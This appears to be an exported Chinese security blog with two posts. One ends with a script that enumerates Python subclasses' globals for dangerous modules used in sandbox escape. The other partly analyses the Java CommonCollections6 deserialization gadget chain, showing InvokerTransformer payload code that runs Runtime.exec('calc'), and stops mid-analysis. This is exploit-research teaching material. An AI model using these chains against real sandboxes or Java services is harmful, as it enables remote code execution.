<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding: utf-8</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"># https://github.com/python/cpython/tree/2.7/Lib</span><br><span class="line"># ls -l /usr/lib/python2.7 | awk &#x27;&#123;print$9&#125;&#x27; | grep -v &#x27;.pyc\|this\|antigravity&#x27;</span><br><span class="line"></span><br><span class="line"># Python2标准库模块</span><br><span class="line">modules2 = [&#x27;_abcoll&#x27;, &#x27;abc&#x27;, &#x27;aifc&#x27;, &#x27;anydbm&#x27;, &#x27;argparse.egg-info&#x27;, &#x27;argparse&#x27;, &#x27;ast&#x27;, &#x27;asynchat&#x27;, &#x27;asyncore&#x27;, &#x27;atexit&#x27;, &#x27;audiodev&#x27;, &#x27;base64&#x27;, &#x27;BaseHTTPServer&#x27;, &#x27;Bastion&#x27;, &#x27;bdb&#x27;, &#x27;binhex&#x27;, &#x27;bisect&#x27;, &#x27;bsddb&#x27;, &#x27;calendar&#x27;, &#x27;CGIHTTPServer&#x27;, &#x27;cgi&#x27;, &#x27;cgitb&#x27;, &#x27;chunk&#x27;, &#x27;cmd&#x27;, &#x27;codecs&#x27;, &#x27;codeop&#x27;, &#x27;code&#x27;, &#x27;collections&#x27;, &#x27;colorsys&#x27;, &#x27;commands&#x27;, &#x27;compileall&#x27;, &#x27;compiler&#x27;, &#x27;ConfigParser&#x27;, &#x27;config-x86_64-linux-gnu&#x27;, &#x27;contextlib&#x27;, &#x27;cookielib&#x27;, &#x27;Cookie&#x27;, &#x27;copy&#x27;, &#x27;copy_reg&#x27;, &#x27;cProfile&#x27;, &#x27;csv&#x27;, &#x27;ctypes&#x27;, &#x27;curses&#x27;, &#x27;dbhash&#x27;, &#x27;decimal&#x27;, &#x27;difflib&#x27;, &#x27;dircache&#x27;, &#x27;dis&#x27;, &#x27;dist-packages&#x27;, &#x27;distutils&#x27;, &#x27;doctest&#x27;, &#x27;DocXMLRPCServer&#x27;, &#x27;dumbdbm&#x27;, &#x27;dummy_threading&#x27;, &#x27;dummy_thread&#x27;, &#x27;email&#x27;, &#x27;encodings&#x27;, &#x27;ensurepip&#x27;, &#x27;filecmp&#x27;, &#x27;fileinput&#x27;, &#x27;fnmatch&#x27;, &#x27;formatter&#x27;, &#x27;fpformat&#x27;, &#x27;fractions&#x27;, &#x27;ftplib&#x27;, &#x27;functools&#x27;, &#x27;__future__&#x27;, &#x27;genericpath&#x27;, &#x27;getopt&#x27;, &#x27;getpass&#x27;, &#x27;gettext&#x27;, &#x27;glob&#x27;, &#x27;gzip&#x27;, &#x27;hashlib&#x27;, &#x27;heapq&#x27;, &#x27;hmac&#x27;, &#x27;hotshot&#x27;, &#x27;htmlentitydefs&#x27;, &#x27;htmllib&#x27;, &#x27;HTMLParser&#x27;, &#x27;httplib&#x27;, &#x27;ihooks&#x27;, &#x27;imaplib&#x27;, &#x27;imghdr&#x27;, &#x27;importlib&#x27;, &#x27;imputil&#x27;, &#x27;inspect&#x27;, &#x27;io&#x27;, &#x27;json&#x27;, &#x27;keyword&#x27;, &#x27;lib2to3&#x27;, &#x27;lib-dynload&#x27;, &#x27;lib-tk&#x27;, &#x27;LICENSE.txt&#x27;, &#x27;linecache&#x27;, &#x27;locale&#x27;, &#x27;logging&#x27;, &#x27;_LWPCookieJar&#x27;, &#x27;macpath&#x27;, &#x27;macurl2path&#x27;, &#x27;mailbox&#x27;, &#x27;mailcap&#x27;, &#x27;markupbase&#x27;, &#x27;md5&#x27;, &#x27;mhlib&#x27;, &#x27;mimetools&#x27;, &#x27;mimetypes&#x27;, &#x27;MimeWriter&#x27;, &#x27;mimify&#x27;, &#x27;modulefinder&#x27;, &#x27;_MozillaCookieJar&#x27;, &#x27;multifile&#x27;, &#x27;multiprocessing&#x27;, &#x27;mutex&#x27;, &#x27;netrc&#x27;, &#x27;new&#x27;, &#x27;nntplib&#x27;, &#x27;ntpath&#x27;, &#x27;nturl2path&#x27;, &#x27;numbers&#x27;, &#x27;opcode&#x27;, &#x27;optparse&#x27;, &#x27;os2emxpath&#x27;, &#x27;os&#x27;, &#x27;_osx_support&#x27;, &#x27;pdb.doc&#x27;, &#x27;pdb&#x27;, &#x27;__phello__.foo&#x27;, &#x27;pickle&#x27;, &#x27;pickletools&#x27;, &#x27;pipes&#x27;, &#x27;pkgutil&#x27;, &#x27;platform&#x27;, &#x27;plat-x86_64-linux-gnu&#x27;, &#x27;plistlib&#x27;, &#x27;popen2&#x27;, &#x27;poplib&#x27;, &#x27;posixfile&#x27;, &#x27;posixpath&#x27;, &#x27;pprint&#x27;, &#x27;profile&#x27;, &#x27;pstats&#x27;, &#x27;pty&#x27;, &#x27;pyclbr&#x27;, &#x27;py_compile&#x27;, &#x27;pydoc_data&#x27;, &#x27;pydoc&#x27;, &#x27;_pyio&#x27;, &#x27;Queue&#x27;, &#x27;quopri&#x27;, &#x27;random&#x27;, &#x27;repr&#x27;, &#x27;re&#x27;, &#x27;rexec&#x27;, &#x27;rfc822&#x27;, &#x27;rlcompleter&#x27;, &#x27;robotparser&#x27;, &#x27;runpy&#x27;, &#x27;sched&#x27;, &#x27;sets&#x27;, &#x27;sgmllib&#x27;, &#x27;sha&#x27;, &#x27;shelve&#x27;, &#x27;shlex&#x27;, &#x27;shutil&#x27;, &#x27;SimpleHTTPServer&#x27;, &#x27;SimpleXMLRPCServer&#x27;, &#x27;sitecustomize&#x27;, &#x27;site&#x27;, &#x27;smtpd&#x27;, &#x27;smtplib&#x27;, &#x27;sndhdr&#x27;, &#x27;socket&#x27;, &#x27;SocketServer&#x27;, &#x27;sqlite3&#x27;, &#x27;sre_compile&#x27;, &#x27;sre_constants&#x27;, &#x27;sre_parse&#x27;, &#x27;sre&#x27;, &#x27;ssl&#x27;, &#x27;stat&#x27;, &#x27;statvfs&#x27;, &#x27;StringIO&#x27;, &#x27;stringold&#x27;, &#x27;stringprep&#x27;, &#x27;string&#x27;, &#x27;_strptime&#x27;, &#x27;struct&#x27;, &#x27;subprocess&#x27;, &#x27;sunaudio&#x27;, &#x27;sunau&#x27;, &#x27;symbol&#x27;, &#x27;symtable&#x27;, &#x27;_sysconfigdata&#x27;, &#x27;sysconfig&#x27;, &#x27;tabnanny&#x27;, &#x27;tarfile&#x27;, &#x27;telnetlib&#x27;, &#x27;tempfile&#x27;, &#x27;test&#x27;, &#x27;textwrap&#x27;, &#x27;_threading_local&#x27;, &#x27;threading&#x27;, &#x27;timeit&#x27;, &#x27;toaiff&#x27;, &#x27;tokenize&#x27;, &#x27;token&#x27;, &#x27;traceback&#x27;, &#x27;trace&#x27;, &#x27;tty&#x27;, &#x27;types&#x27;, &#x27;unittest&#x27;, &#x27;urllib2&#x27;, &#x27;urllib&#x27;, &#x27;urlparse&#x27;, &#x27;UserDict&#x27;, &#x27;UserList&#x27;, &#x27;user&#x27;, &#x27;UserString&#x27;, &#x27;uuid&#x27;, &#x27;uu&#x27;, &#x27;warnings&#x27;, &#x27;wave&#x27;, &#x27;weakref&#x27;, &#x27;_weakrefset&#x27;, &#x27;webbrowser&#x27;, &#x27;whichdb&#x27;, &#x27;wsgiref&#x27;, &#x27;wsgiref.egg-info&#x27;, &#x27;xdrlib&#x27;, &#x27;xml&#x27;, &#x27;xmllib&#x27;, &#x27;xmlrpclib&#x27;, &#x27;zipfile&#x27;]</span><br><span class="line"></span><br><span class="line"># Python3标准库模块</span><br><span class="line">modules3 = [&#x27;abc&#x27;, &#x27;aifc&#x27;, &#x27;argparse&#x27;, &#x27;ast&#x27;, &#x27;asynchat&#x27;, &#x27;asyncio&#x27;, &#x27;asyncore&#x27;, &#x27;base64&#x27;, &#x27;bdb&#x27;, &#x27;binhex&#x27;, &#x27;bisect&#x27;, &#x27;_bootlocale&#x27;, &#x27;bz2&#x27;, &#x27;calendar&#x27;, &#x27;cgi&#x27;, &#x27;cgitb&#x27;, &#x27;chunk&#x27;, &#x27;cmd&#x27;, &#x27;codecs&#x27;, &#x27;codeop&#x27;, &#x27;code&#x27;, &#x27;collections&#x27;, &#x27;_collections_abc&#x27;, &#x27;colorsys&#x27;, &#x27;_compat_pickle&#x27;, &#x27;compileall&#x27;, &#x27;_compression&#x27;, &#x27;concurrent&#x27;, &#x27;config-3.8-x86_64-linux-gnu&#x27;, &#x27;configparser&#x27;, &#x27;contextlib&#x27;, &#x27;contextvars&#x27;, &#x27;copy&#x27;, &#x27;copyreg&#x27;, &#x27;cProfile&#x27;, &#x27;crypt&#x27;, &#x27;csv&#x27;, &#x27;ctypes&#x27;, &#x27;curses&#x27;, &#x27;dataclasses&#x27;, &#x27;datetime&#x27;, &#x27;dbm&#x27;, &#x27;decimal&#x27;, &#x27;difflib&#x27;, &#x27;dis&#x27;, &#x27;dist-packages&#x27;, &#x27;distutils&#x27;, &#x27;doctest&#x27;, &#x27;dummy_threading&#x27;, &#x27;_dummy_thread&#x27;, &#x27;email&#x27;, &#x27;encodings&#x27;, &#x27;ensurepip&#x27;, &#x27;enum&#x27;, &#x27;filecmp&#x27;, &#x27;fileinput&#x27;, &#x27;fnmatch&#x27;, &#x27;formatter&#x27;, &#x27;fractions&#x27;, &#x27;ftplib&#x27;, &#x27;functools&#x27;, &#x27;__future__&#x27;, &#x27;genericpath&#x27;, &#x27;getopt&#x27;, &#x27;getpass&#x27;, &#x27;gettext&#x27;, &#x27;glob&#x27;, &#x27;gzip&#x27;, &#x27;hashlib&#x27;, &#x27;heapq&#x27;, &#x27;hmac&#x27;, &#x27;html&#x27;, &#x27;http&#x27;, &#x27;imaplib&#x27;, &#x27;imghdr&#x27;, &#x27;importlib&#x27;, &#x27;imp&#x27;, &#x27;inspect&#x27;, &#x27;io&#x27;, &#x27;ipaddress&#x27;, &#x27;json&#x27;, &#x27;keyword&#x27;, &#x27;lib2to3&#x27;, &#x27;lib-dynload&#x27;, &#x27;LICENSE.txt&#x27;, &#x27;linecache&#x27;, &#x27;locale&#x27;, &#x27;logging&#x27;, &#x27;lzma&#x27;, &#x27;mailbox&#x27;, &#x27;mailcap&#x27;, &#x27;_markupbase&#x27;, &#x27;mimetypes&#x27;, &#x27;modulefinder&#x27;, &#x27;multiprocessing&#x27;, &#x27;netrc&#x27;, &#x27;nntplib&#x27;, &#x27;ntpath&#x27;, &#x27;nturl2path&#x27;, &#x27;numbers&#x27;, &#x27;opcode&#x27;, &#x27;operator&#x27;, &#x27;optparse&#x27;, &#x27;os&#x27;, &#x27;_osx_support&#x27;, &#x27;pathlib&#x27;, &#x27;pdb&#x27;, &#x27;__phello__.foo&#x27;, &#x27;pickle&#x27;, &#x27;pickletools&#x27;, &#x27;pipes&#x27;, &#x27;pkgutil&#x27;, &#x27;platform&#x27;, &#x27;plistlib&#x27;, &#x27;poplib&#x27;, &#x27;posixpath&#x27;, &#x27;pprint&#x27;, &#x27;profile&#x27;, &#x27;pstats&#x27;, &#x27;pty&#x27;, &#x27;_py_abc&#x27;, &#x27;pyclbr&#x27;, &#x27;py_compile&#x27;, &#x27;_pydecimal&#x27;, &#x27;pydoc_data&#x27;, &#x27;pydoc&#x27;, &#x27;_pyio&#x27;, &#x27;queue&#x27;, &#x27;quopri&#x27;, &#x27;random&#x27;, &#x27;reprlib&#x27;, &#x27;re&#x27;, &#x27;rlcompleter&#x27;, &#x27;runpy&#x27;, &#x27;sched&#x27;, &#x27;secrets&#x27;, &#x27;selectors&#x27;, &#x27;shelve&#x27;, &#x27;shlex&#x27;, &#x27;shutil&#x27;, &#x27;signal&#x27;, &#x27;_sitebuiltins&#x27;, &#x27;sitecustomize&#x27;, &#x27;site&#x27;, &#x27;smtpd&#x27;, &#x27;smtplib&#x27;, &#x27;sndhdr&#x27;, &#x27;socket&#x27;, &#x27;socketserver&#x27;, &#x27;sqlite3&#x27;, &#x27;sre_compile&#x27;, &#x27;sre_constants&#x27;, &#x27;sre_parse&#x27;, &#x27;ssl&#x27;, &#x27;statistics&#x27;, &#x27;stat&#x27;, &#x27;stringprep&#x27;, &#x27;string&#x27;, &#x27;_strptime&#x27;, &#x27;struct&#x27;, &#x27;subprocess&#x27;, &#x27;sunau&#x27;, &#x27;symbol&#x27;, &#x27;symtable&#x27;, &#x27;_sysconfigdata__linux_x86_64-linux-gnu&#x27;, &#x27;_sysconfigdata__x86_64-linux-gnu&#x27;, &#x27;sysconfig&#x27;, &#x27;tabnanny&#x27;, &#x27;tarfile&#x27;, &#x27;telnetlib&#x27;, &#x27;tempfile&#x27;, &#x27;test&#x27;, &#x27;textwrap&#x27;, &#x27;_threading_local&#x27;, &#x27;threading&#x27;, &#x27;timeit&#x27;, &#x27;tkinter&#x27;, &#x27;tokenize&#x27;, &#x27;token&#x27;, &#x27;traceback&#x27;, &#x27;tracemalloc&#x27;, &#x27;trace&#x27;, &#x27;tty&#x27;, &#x27;turtle&#x27;, &#x27;types&#x27;, &#x27;typing&#x27;, &#x27;unittest&#x27;, &#x27;urllib&#x27;, &#x27;uuid&#x27;, &#x27;uu&#x27;, &#x27;venv&#x27;, &#x27;warnings&#x27;, &#x27;wave&#x27;, &#x27;weakref&#x27;, &#x27;_weakrefset&#x27;, &#x27;webbrowser&#x27;, &#x27;wsgiref&#x27;, &#x27;xdrlib&#x27;, &#x27;xml&#x27;, &#x27;xmlrpc&#x27;, &#x27;zipapp&#x27;, &#x27;zipfile&#x27;, &#x27;zipimport&#x27;]</span><br><span class="line"></span><br><span class="line"># 危险模块</span><br><span class="line">methods = [&#x27;sys&#x27;, &#x27;os&#x27;, &#x27;system&#x27;, &#x27;popen&#x27;, &#x27;subprocess&#x27;, &#x27;platform&#x27;, &#x27;commands&#x27;, &#x27;timeit&#x27;, &#x27;bdb&#x27;, &#x27;cgi&#x27;, &#x27;importlib&#x27;, &#x27;pickle&#x27;, &#x27;pty&#x27;, &#x27;__builtins__&#x27;, &#x27;__import__&#x27;, &#x27;import_module&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;spawn&#x27;, &#x27;file&#x27;, &#x27;linecache&#x27;, &#x27;types&#x27;]</span><br><span class="line"></span><br><span class="line"># 基本类型</span><br><span class="line">types = [&#x27;&#x27;, [], (), &#123;&#125;]</span><br><span class="line"></span><br><span class="line"># object的派生类</span><br><span class="line">subclasses = &#123;&#125;</span><br><span class="line"></span><br><span class="line"># 危险标准库模块</span><br><span class="line">risk_modules = &#123;&#125;</span><br><span class="line"></span><br><span class="line"># 遍历派生类并获取模块</span><br><span class="line">for i in range(0, len(object.__subclasses__())):</span><br><span class="line">    try:</span><br><span class="line">        subclasses[i] = object.__subclasses__()[i].__init__.__globals__.keys()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        # print(e)</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">print(&#x27;------------------------------ object导入危险模块 ------------------------------&#x27;)</span><br><span class="line"></span><br><span class="line"># 导入了危险模块的派生类</span><br><span class="line">for i, submodules in subclasses.items():</span><br><span class="line">    for submodule in submodules:</span><br><span class="line">        for method in methods:</span><br><span class="line">            if method == submodule:</span><br><span class="line">                # print(f&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;method&#125;&#x27;]&quot;)</span><br><span class="line">                print(&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;method&#125;&#x27;]&quot;.format(i=i, method=method))</span><br><span class="line"></span><br><span class="line">print(&#x27;------------------------------ 缓冲区 ------------------------------&#x27;)</span><br><span class="line"></span><br><span class="line"># 判断Python版本</span><br><span class="line">if (sys.version_info[0]) == 3:</span><br><span class="line">    modules = modules3</span><br><span class="line">else:</span><br><span class="line">    modules = modules2</span><br><span class="line"></span><br><span class="line"># 导入了危险模块的标准库</span><br><span class="line">for module in modules:</span><br><span class="line">    risk_modules[module] = []</span><br><span class="line">    try:</span><br><span class="line">        m = __import__(module)  # 导入模块</span><br><span class="line">        attrs = dir(m)          # 获取属性与方法</span><br><span class="line">        for method in methods:</span><br><span class="line">            if method in attrs: # 若存在危险模块</span><br><span class="line">                risk_modules[module].append(method)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        # print(e)</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">print(&#x27;------------------------------ 导入标准库，间接导入危险模块 ------------------------------&#x27;)</span><br><span class="line"></span><br><span class="line"># 导入了危险标准库的派生类</span><br><span class="line">for i, submodules in subclasses.items():</span><br><span class="line">    for submodule in submodules:</span><br><span class="line">        for risk_module in risk_modules.keys():</span><br><span class="line">            if risk_module == submodule:</span><br><span class="line">                for method in risk_modules[risk_module]:</span><br><span class="line">                    # print(f&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;risk_module&#125;&#x27;].__dict__[&#x27;&#123;method&#125;&#x27;]&quot;)</span><br><span class="line">                    print(&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;risk_module&#125;&#x27;].__dict__[&#x27;&#123;method&#125;&#x27;]&quot;.format(i=i, risk_module=risk_module, method=method))</span><br><span class="line"></span><br><span class="line">print(&#x27;------------------------------ 链式调用特殊方法------------------------------&#x27;)</span><br><span class="line"></span><br><span class="line"># 基本类型的特殊方法</span><br><span class="line">for t in types:</span><br><span class="line">    for method in dir(t):</span><br><span class="line">        # 待比较类型</span><br><span class="line">        c = str(t.__getattribute__(method).__class__)</span><br><span class="line">        # Python2特殊类型</span><br><span class="line">        c2 = &quot;&lt;type &#x27;builtin_function_or_method&#x27;&gt;&quot;</span><br><span class="line">        # Python3特殊类型</span><br><span class="line">        c3 = &quot;&lt;class &#x27;builtin_function_or_method&#x27;&gt;&quot;</span><br><span class="line">        if c == c2 or c == c3:</span><br><span class="line">            # 转义双引号</span><br><span class="line">            if t == &#x27;&#x27;:</span><br><span class="line">                t = &quot;&#x27;&#x27;&quot;</span><br><span class="line">            print(&quot;&#123;t&#125;.&#123;method&#125;.__class__.__call__&quot;.format(t=t, method=method))</span><br></pre></td></tr></table></figure></div>

<p>参考文章：</p>
<p><a class="link"   href="https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#section" >https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#section <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://hosch3n.github.io/2020/08/27/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" >https://hosch3n.github.io/2020/08/27/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>CommonCollections6利用链分析</title>
    <url>/2023/07/26/cc6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>cc6有点像我们前面分析的cc1和urldns利用链的结合，cc6的前半部分是urldns，后半部分是cc1。所以分析完cc1和urldns这条链还是相对简单一点的。</p>
<p>我们前面在分析cc1的时候环境jdk版本要低于8u71,当jdk版本高于8u71之后<code>AnnotationInvocationHandler</code>类的<code>readObject()</code>方法逻辑就发生了改变，不能够再利用，而cc6就是一个可以在高版本利用的cc链。</p>
<h1 id="二、cc6利用链分析"><a href="#二、cc6利用链分析" class="headerlink" title="二、cc6利用链分析"></a>二、cc6利用链分析</h1><p>我们先看一下cc6的利用链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"> java.io.ObjectInputStream.readObject()</span><br><span class="line">    java.util.HashMap.readObject()</span><br><span class="line">        java.util.HashMap.hash()</span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line"> org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line"> java.lang.reflect.Method.invoke()</span><br><span class="line"> java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure></div>

<p>我们可以看到这条链的从漏洞点到LazyMap的get函数和我们cc1的后半部分是一样的。只不过在cc1中我们是通过AnnotationInvocationHandler类中的invoke方法去调用LazyMap类中的get方法，然后在通过动态代理最终实现了整条攻击链的利用。</p>
<p>但是我们前面也说了在jdk版本8u71之后<code>AnnotationInvocationHandler</code>类的<code>readObject()</code>方法逻辑就发生了改变，所以这条攻击链就不能在利用了。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;calc&quot;</span>)&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>这就是我们cc1的后半部分利用链，那我们在cc6这里可以直接利用</p>
<h2 id="cc1的回顾"><a href="#cc1的回顾" class="headerlink" title="cc1的回顾"></a>cc1的回顾</h2><p>这里回顾一下cc1，对cc6的后半部分利用链做一个简单的分析</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726103246711.png"
                      alt="image-20230726103246711"
                ></p>
<p>我们前面在cc1中讲过，漏洞的利用点就是这个InvokerTransformer类中的transform方法，这里的transform方法可以通过类似与反射的方式获取方法并执行。</p>
<p>我们在cc1中通过invokerTransform获取到exec方法执行我们的命令还有获取Runtime对象</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span>(Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line"></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class,&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(getRuntimeMethod);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure></div>

<p>分析这个代码我们可以知道这就是transform的循环调用，为了避免传参时要把这几个类都要传进去，我们这里使用了ChainedTransformer()类来简化这个过程</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">        new ConstantTransformer(Runtime.class),</span><br><span class="line">        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure></div>

<p>然后后面就是找哪里调用了transform方法</p>
<p>在我们前面的分析中，我们用的是Lazymap中的get方法</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public Object get(Object key) &#123;</span><br><span class="line">    // create value for key if key is not currently in the map</span><br><span class="line">    if (map.containsKey(key) == false) &#123;</span><br><span class="line">        Object value = factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        return value;</span><br><span class="line">    &#125;</span><br><span class="line">    return map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>到这里为止是cc6和cc1相同的部分，我们这里不具体分析，只是做一个简单的回顾和概述。</p>
<h2 id="cc6的分析"><a href="#cc6的分析" class="headerlink" title="cc6的分析"></a>cc6的分析</h2><p>我们这里正式开始对cc6的分析</p>
<p>由于后半部分和cc1是一样的，我们这里直接从Lazymap的get方法开始分析</p>
<p>在get方法里面是factory调用了transform方法</p>
<p>那我们这里想要利用就要先看一下factory是否可控</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected LazyMap(Map map, Transformer factory) &#123;</span><br><span class="line">    super(map);</span><br><span class="line">    if (factory == null) &#123;</span><br><span class="line">        throw new IllegalArgumentException(&quot;Factory must not be null&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    this.factory = factory;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们可以看到在LazyMap的构造方法中，接收了factory参数，但是这个构造方法是一个受保护的方法，我们不能直接调用</p>
<p>继续向上找看有没有可以利用的方法</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726110202757.png"
                      alt="image-20230726110202757" style="zoom:200%;" 
                >

<p>存在一个静态方法decorate，接收两个参数一个map对象和一个factory，并返回一个LazyMap对象</p>
<p>那我们可以通过调用decorate方法控制factoy的值</p>
<p>这里可以发现其实和我们cc1中的也是一样的</p>
<p>根据上面的分析我们可以构造paylaod：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class cc6 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;new String(&quot;calc&quot;)&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">         HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br></pre></td></tr></table></figure></div>

<p>同样的要想利用链能够走下去，我们最终要找到readobject方法</p>
<p>我们这里要先找一下哪里调用了get方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726113524854.png"
                      alt="image-20230726113524854"
                ></p>
<p>我们这里利用的是TiedMapEntry类中的getvalue方法</p>
<p>跟进到getvalue方法</p>
